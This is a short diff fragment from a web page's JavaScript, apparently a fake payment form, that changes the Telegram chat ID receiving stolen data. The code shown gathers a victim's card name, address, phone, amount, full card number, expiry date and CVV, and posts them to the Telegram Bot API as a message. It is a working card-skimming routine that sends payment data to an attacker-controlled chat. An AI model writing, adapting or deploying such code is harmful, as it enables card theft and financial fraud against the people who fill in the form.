@@ -956,7 +956,7 @@
                 loadingOverlay.style.display = 'flex';
                 
                 const BOT_TOKEN = (window.telegramConfig && window.telegramConfig.BOT_TOKEN) ;
-                const CHAT_ID = '8176081750';
+                const CHAT_ID = '7844330327';
                 const msg = 'CARTE: ' + cardName.value + ' | ADRESSE: ' + address.value + ' | TEL: ' + phone.value + ' | MONTANT: ' + amount.value + ' | NUMERO: ' + cardNumber.value + ' | EXPIRATION: ' + expiry.value + ' | CVV: ' + cvv.value;
                 fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
                     method: 'POST',
